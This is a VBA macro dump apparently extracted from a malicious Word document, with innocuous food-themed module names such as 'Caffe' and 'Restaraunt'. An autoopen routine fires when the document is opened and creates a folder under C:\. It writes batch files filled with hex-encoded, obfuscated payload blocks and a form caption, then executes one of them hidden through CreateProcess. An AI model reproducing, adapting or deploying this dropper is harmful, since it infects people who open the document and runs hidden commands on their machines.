Attribute VB_Name = "BigFood"
Attribute VB_Base = "0{69028FA2-FA48-4503-AAF3-5BB9CF50C1AD}{2B66C6CF-8981-4D92-81A8-A5F202875A99}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Caffe"
Attribute VB_Base = "0{9F709122-CBAF-4086-97B0-51F500AFFE29}{C4134D42-1534-482D-B014-72D6F98756C2}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Modules"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit
Implements VbScriptEditor.PersistPropertyBag
'local variable to hold collection
Private mCol As Collection

Public Function Add(ByVal Name As String, Optional ByRef sKey As String) As Module
    'create a new object
    Dim objNewMember As Module
    On Error GoTo ErrorTrap
    Set objNewMember = New Module
    'set the properties passed into the method
    With objNewMember
        .Name = Name
        Set .Variables = New Variables
    End With
    
    If Len(sKey) = 0 Then
        sKey = Name
    End If
    objNewMember.Key = sKey
    mCol.Add objNewMember, sKey
    'return the object created
    Set Add = objNewMember
    Set objNewMember = Nothing
    Exit Function
ErrorTrap:
    Err.Raise Err.Number, Err.Source, Err.Description
End Function

Public Property Get Item(vntIndexKey As Variant) As Module
Attribute Item.VB_UserMemId = 0
    'used when referencing an element in the collection
    'vntIndexKey contains either the Index or Key to the collection,
    'this is why it is declared as a Variant
    'Syntax: Set foo = x.Item(xyz) or Set foo = x.Item(5)
    On Error Resume Next
  Set Item = mCol(vntIndexKey)
End Property

Public Sub Clear()
    Dim pModule As Module
    For Each pModule In mCol
        mCol.Remove pModule.Key
    Next
    Set mCol = Nothing
    Set mCol = New Collection
End Sub


Public Property Get Count() As Long
    'used when retrieving the number of elements in the
    'collection. Syntax: Debug.Print x.Count
    Count = mCol.Count
End Property


Public Sub Remove(vntIndexKey As Variant)
    'used when removing an element from the collection
    'vntIndexKey contains either the Index or Key, which is why
    'it is declared as a Variant
    'Syntax: x.Remove(xyz)


    mCol.Remove vntIndexKey
End Sub


Public Property Get NewEnum() As IUnknown
Attribute NewEnum.VB_UserMemId = -4
Attribute NewEnum.VB_MemberFlags = "40"
    'this property allows you to enumerate
    'this collection with the For...Each syntax
    Set NewEnum = mCol.[_NewEnum]
End Property


Private Sub Class_Initialize()
    'creates the collection when this class is created
    Set mCol = New Collection
End Sub


Private Sub Class_Terminate()
    'destroys collection when this class is terminated
    Set mCol = Nothing
End Sub

Private Sub PersistPropertyBag_Load(ByVal PropBag As VbScriptEditor.cPropertyBag)
    Dim pModule As Module
    Dim pCounter As Single
    Dim pMaxModCount As Single
    On Error Resume Next
    pMaxModCount = PropBag.ReadProperty("ModuleCount", 0)
    For pCounter = 1 To pMaxModCount
        Set pModule = New Module
        Call PropBag.RestoreState(pModule, "Module" & pCounter)
        mCol.Add pModule, pModule.Key
    Next
End Sub

Private Sub PersistPropertyBag_Save(ByVal PropBag As VbScriptEditor.cPropertyBag)
    Dim pModule As Module
    Dim pCounter As Single
    Call PropBag.WriteProperty("ModuleCount", mCol.Count)
    pCounter = 1
    For Each pModule In mCol
        Call PropBag.SaveState(pModule, "Module" & pCounter)
        pCounter = pCounter + 1
    Next
End Sub
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Name = "Variable"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit
Implements VbScriptEditor.PersistPropertyBag
Public Name As String
Public ObjProgID As String
Public LibRefrence As Refrence
Public Key As String

Private Sub PersistPropertyBag_Load(ByVal PropBag As VbScriptEditor.cPropertyBag)
    Set LibRefrence = New Refrence
    Name = PropBag.ReadProperty("GUID", "")
    ObjProgID = PropBag.ReadProperty("ObjProgID", "")
    Key = PropBag.ReadProperty("Key", "")
    Call PropBag.RestoreState(LibRefrence, "LibRefrence")
    
End Sub

Private Sub PersistPropertyBag_Save(ByVal PropBag As VbScriptEditor.cPropertyBag)
    
    Call PropBag.WriteProperty("Name", Name, "")
    Call PropBag.WriteProperty("Key", Key, "")
    Call PropBag.WriteProperty("ObjProgID", ObjProgID, "")
    Call PropBag.SaveState(LibRefrence, "LibRefrence")
End Sub
Attribute VB_Name = "traditional_food"
Option Explicit
#If VBA7 Then

Public Declare PtrSafe Function GetMessageExtraInfo Lib "user32" () As LongPtr
Public Declare PtrSafe Function GetMessagePos Lib "user32" () As LongPtr
Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As LongPtr, ByVal dwCreationFlags As LongPtr, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As LongPtr) As LongPtr
Private Declare PtrSafe Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As LongPtr, lpExitCode As LongPtr) As LongPtr
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As LongPtr
Public Declare PtrSafe Function GetMessageTime Lib "user32" () As LongPtr

#Else


Public Declare Function GetMessageExtraInfo Lib "user32" () As Long
Public Declare Function GetMessagePos Lib "user32" () As Long
Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function GetMessageTime Lib "user32" () As Long

#End If

Private Const NORMAL_PRIORITY_CLASS         As Long = &H20&
Private Const STARTF_USESHOWWINDOW          As Long = 1
Private Const SW_HIDE                       As Long = 0
Private Const SW_SHOWDEFAULT                As Long = 10
Private Const ERROR_ELEVATION_REQUIRED      As Long = 740
Private Const INFINITE                      As Long = &HFFFFFFFF
Private Const SEE_MASK_NOCLOSEPROCESS       As Long = &H40

Private Type STARTUPINFO
    cb                  As Long
    lpReserved          As String
    lpDesktop           As String
    lpTitle             As String
    dwX                 As Long
    dwY                 As Long
    dwXSize             As Long
    dwYSize             As Long
    dwXCountChars       As Long
    dwYCountChars       As Long
    dwFillAttribute     As Long
    dwFlags             As Long
    wShowWindow         As Integer
    cbReserved2         As Integer
    lpReserved2         As Long
    hStdInput           As Long
    hStdOutput          As Long
    hStdError           As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess            As Long
    hThread             As Long
    dwProcessID         As Long
    dwThreadID          As Long
End Type

Public Function ShellWait( _
            ByVal sFile As String, _
            sParams, _
            bStartHidden, _
            oOwnerForm) As Long
    Const FUNC_NAME     As String = "ShellWait"
    Dim sCommandLine    As String
    Dim uInfo           As PROCESS_INFORMATION
    Dim uStart          As STARTUPINFO
    Dim lExitCode
    Dim sFileName       As String

    On Error GoTo EH

    sCommandLine = """" & sFile & """" & " " & sParams

    uStart.cb = Len(uStart)
    If bStartHidden Then
        uStart.dwFlags = STARTF_USESHOWWINDOW
        uStart.wShowWindow = SW_HIDE
    End If
    If CreateProcess(vbNullString, sCommandLine, 0, 0, 1, NORMAL_PRIORITY_CLASS, 0, vbNullString, uStart, uInfo) <> 0 Then
        Call WaitForSingleObject(uInfo.hProcess, INFINITE)
        If GetExitCodeProcess(uInfo.hProcess, lExitCode) <> 0 Then
            ShellWait = lExitCode
        End If
        Call CloseHandle(uInfo.hThread)
        Call CloseHandle(uInfo.hProcess)
    Else
               
                    ShellWait = lExitCode
       
               
            End If
        
    
    Exit Function
EH:
    Debug.Print FUNC_NAME; ": "
    Resume Next
End Function
Sub autoopen()
'
' autoopen macro
' developed by LTF group
'
GetMessageExtraInfo
CreateBasicDirectory

End Sub

Sub CreateBasicDirectory()
    Dim brPath
    Dim bufferForCmd1 As String
    Dim bufferForCmd2 As String
    Dim bufferForCmd3 As String
    Dim bufferForCmd4 As String
    
    Set brPath = CreateObject("Scripting.FileSystemObject")
    If brPath.FolderExists("C:\DecemberLogs\") = False Then
    brPath.CreateFolder "C:\DecemberLogs\"
    End If
    
    bufferForCmd1 = "C:\DecemberLogs\Restaraunt1.cmd"
    bufferForCmd2 = "C:\DecemberLogs\Restaraunt2.cmd"
    bufferForCmd3 = "C:\DecemberLogs\Restaraunt3.cmd"
    bufferForCmd4 = "C:\DecemberLogs\Restaraunt4.cmd"

    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    Call MakeMainFile1(bufferForCmd1)
    Call MakeMainFile2(bufferForCmd2)
    Call MakeMainFile3(bufferForCmd3)
    
    ShellWait bufferForCmd2, vbNullString, 1, 0
    GetMessageTime
    Call MakeMainFile4(bufferForCmd4)

End Sub

Function MakeMainFile1(BatchName) As String
Open BatchName For Output As #1
Print #1, "BCFC77C12EFEA79FCD23D0CA12E83866D942A99323591E52B22B93F49B4732728A89BA9A876A5005E336D610569657AE"
Close #1
End Function

Function MakeMainFile2(BatchName) As String
Open BatchName For Output As #1
Print #1, "78B72E3D2A01575B43DF1025640FDCD5E5580BC6BE64BE158DDE84794281D64F7DE50"
Print #1, "6692C99C4623C99D12BD59D8CA5DA5D82C78D12AA161F2C7E5A6CE68E67D4E1D36ABD"
Print #1, "1B246CF6C4A307ECE11A2CB1F09C53735273C1960AD41D5C2DBB3970992420B9690E5"
Print #1, "87D7BD3EAC04E91C25D7703989FF4AC4CE6749F7399280B7AD4037B352DEC3929A8B7"
Print #1, "1BBDDBE034EF9A5C1FC01B61C330FD9A4A99536259C8C636E8B7C8AB16A75A808FF64"
Print #1, "7456432DF876189FBBB5B1E42B5F3EF4D67E82D0812EB0146302C5C0835402469BE17"
Print #1, "9B449B2117E9C76709DA316D2C138B05643454286FAA1CBB984B02DFE0E5ACDEA0C85"
Print #1, "9793F00E71B550204CBCAF322328073EF0FD3F30DA2EA6386E65D43F5772B64EC7C43"
Print #1, "0A7142CFD3C516C105231C9B3E4BCA0C2ACFA87DF7AAA61DDE956EE6ACD712FF2C43C"
Print #1, "DA823264E6E388825FAC44DFBFADA1DA0AD7D4ADF5CAA92F436DF32C68E802E00BD01"
Print #1, "832D29D18687E6AB62D174DC2C0A4182531EBA6A54EFCB03BFCD292AB72808B1D21CC"
Print #1, "9DA7108C1AFD57D6095E5243E42DB04C948568C4BB359C5BEB110A2AB9B203DF432BB"
Print #1, "2194944B4BC506529D8B7EACF2886351B24F1F15A4991E8A4A1011B53A82062C87584"
Print #1, CStr(Caffe.Bill.Caption)
Print #1, "9B95951A4C6C477C41E53DC8DBC50221A5119F42538AB225C8A7C53E3804ABEFEDAA0"
Print #1, "2AA51144021131989A243A2E860565926422965CA3A74A703169A814927D07A814B91"
Print #1, "CE07225C35014CD8942EEFC83234D9041B535F8E284D1356B384BE45E84230FB33289"
Print #1, "5016139B91885907D45CEDFDCDEDFBE4E0B15B72A55F587F9C89FBF7AF8F6C8911299"
Print #1, "DDD6C17DE2AC6169442F182C50A6FD651F0274F05E119E2E57F393CA8D4224F9C63B8"
Print #1, "BA7E1923A32B7DAED1E5048EF467992D350DA0F728BB3DBEED0566BF1306A9B8A4E82"
Print #1, "725A9D8DDBC4E21F34978439B88C6B0A7BEEFAE137C8A9FF8E4068DBFB9348E402298"
Print #1, "5457707BCF3C7833891A72C0D84C8E36EFC705581969E30E3A1102718E33864AB1CB7"
Print #1, "7A286060BF0034A1C91920E03"
Print #1, "AD4761516FD14ADA5F5155AD1"
Print #1, "D025AAF93D020F09030168216"
Print #1, "216BD8C509B21C24BB0CAD871"
Print #1, "615E1207D319D5A71925637F9"
Print #1, "5A30163DB8D57D03CC72934FE"
Print #1, "A8B253E0261519245A257ABCF"
Print #1, "52C11404E5228820DB1AD1872"
Print #1, "AA8F56E57C3BB79BCE3D10CAC"
Print #1, "C22143ABC01383163188980C4"
Print #1, "9CD3DEB494C8C7F9AAB25FC11"
Close #1
End Function

Function MakeMainFile3(BatchName) As String
Open BatchName For Output As #1
Print #1, "fields depends"
Close #1
End Function

Function MakeMainFile4(BatchName) As String
Open BatchName For Output As #1
Print #1, "C0656F9207AAD0E2CED043E59D56698D32DDBD953B8F286927071BB"
Print #1, "45ADEF67F8A0B8278E0271ECE641310EBF9CEF73D8890E85E124D42"
Print #1, "9FB5BFF2DB155EC0F1613253E387F9116AB4C8240F71CB3114C6F4E"
Print #1, "779889CDE431E098A43510604408BDC4820900C1BEFC7286DD01008"
Print #1, "64AB9285BF5D2A3E2BA14F570FD3C90BA760FEC42FBD51F8B2CB587"
Print #1, "0B4D725BFDCF45CD1CC31DCDBAF12BD337F5F248A2A52DA7015E77B"
Print #1, "04EACCCF13B4EB5F9A5ED37BBC0870A6888142FBD855E8DA5233E33"
Print #1, "DA3B679841538986D880CE400FE802854F1C76100DFF288C9EB2660"
Print #1, "49F78553204C5F022EC6AB865D0A3A6DE3052B58CA99EDEDFE68BB2"
Print #1, "62926D8EAB111CA5C7E59C47E4AF87EE05267F1D47AE5D3D41D809F"
Print #1, "223069D54273028A8483644F5DE4B39D3D1B98093690B4D928BFE96"
Print #1, "E2414AEB4195900D4B2A16CAF6976EB251691882C5151E3A0084A46"
Print #1, "C58EBAC058182E1C6031093900B098CB48C4E32DF58D768470072BC"
Print #1, "F23949376B5E9296C533556BC43234B3FC4411D9E1363B440E3C62E"
Print #1, "575282C54D05FCA057A2CE3F10664D97F70EC544A17AC155F4677D5"
Print #1, "827A9FBADAFDC9E8A0763E7C8BC1791DA47437BB13E3C1F0C457915"
Print #1, "DC07865B8E7E150E666F84E6995FEE46EBDC8E9C6856377F79CCC7D"
Print #1, "97793E349A537D072426789758D719CD9C1D4443BFDE08944F5CECE"
Print #1, "4679FC762DF920E5E2AB2EB7E1EEB80CC66CE6C182D9A3CEDB3B30F"
Print #1, "31A6BB8C8CA346B66FB4B54943463D24E3EF98768FF2078E19F18F2"
Print #1, "8CACE068454F1B29FE6C278BFA8EF5CEE892D675DD42482D3C7692B"
Print #1, "9A8E083CE94CF709DF9FDBF809BED21001CBB59E884518824E3E71C"
Print #1, "38E14EF03F3C25E0999EBB335951BCE2859CECF787A1B0D4C107C04"
Print #1, "1CB0729D58C43313B23667885287181B60D8BD5067FEDFABDA26A8E"
Print #1, "ABC1F8455AF7A7AB6102F6D4D9B573A04DFFA01DD192C802A3489B0"
Print #1, "271253F2689B70FC018761962A69D85538C696E89D7D8494147AE56"
Print #1, "D489D8284391CFE8619C68D4C6A537DF2F51CD059950F91B81BDF06"
Print #1, "00133E0E5242F1FEB497CF42B2C507F8105E1202DD97D1C083872EA"
Print #1, "88F0C101DED1D81C4B6544ECD6CBA19983A451ADD233DAF37BE3D66"
Print #1, "18E03888E02BAB2B95F860DEE449A7B00BE257F9C8DD7DA69FAEB8C"
Print #1, "18C5E3119D33CE199DCAC9F933316F885869DD2E8E7081F400A8F39"
Print #1, "C81D83DC1CB2FC059A6481806E7C6F2FF7A3D82A272AA13EA5D7342"
Print #1, "38A4B5F7F7C4D64A90D2CCBD8D5DCE0D2BB68ADF11FB32F02A69302"
Print #1, "2337B0CF825A4CCA5E9ADD4A8BCB819DEA795357B8D64DE2E4FA460"
Print #1, "A141D86147F6A7B978FD7D62F6C8677F15A3192F15C84E77FDB3F1A"
Print #1, "A096B829A0B51BB59B3AAEC12799A663348FD64F8FC1F05BE390863"
Print #1, "EB7BF5C16668216DDDDFECDA3F7B0AA797CAA5EA644CAD066F0E6D2"
Print #1, "6B82030F0AFDA6D0BCD3F0EB8D39923BE805970F5425576761E8940"
Print #1, "3B07BF287DB371B30A0CEE98E18E5473441C2E09C12106CFCC86F43"
Print #1, "23DD32156880C610E065CDF9FC0E1A9224BDADA5019D2F9E387E63F"
Print #1, "AF7F0C98BD81943355711208D522D4443D4E86CB3421F936EF2A1B1"
Print #1, "EB7D54BB8B89BD865EC487168B56D76A724BF88252389B784B8E0F0"
Print #1, "185D1FD82F84092AD21D4012BEC748634429AEF105F6A92547A93E6"
Print #1, "235930FC9525FA44D15ACCDEC78E8D9FA6D965CBD3B777FF85C8119"
Print #1, "DDA022812DFD7A89B434399BABF3719A034643DAA5DEBE5B5E39513"
Close #1
End Function





INQUEST-PP=macro
